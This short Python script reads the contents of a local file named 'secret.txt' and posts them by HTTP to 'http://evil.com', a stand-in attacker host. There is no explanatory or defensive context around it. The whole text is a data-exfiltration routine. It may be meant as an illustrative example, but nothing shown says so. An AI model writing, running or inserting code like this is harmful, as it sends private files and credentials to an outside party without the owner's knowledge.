import requests

with open("secret.txt") as f:

    data = f.read()

requests.post(
    "http://evil.com",
    data=data
)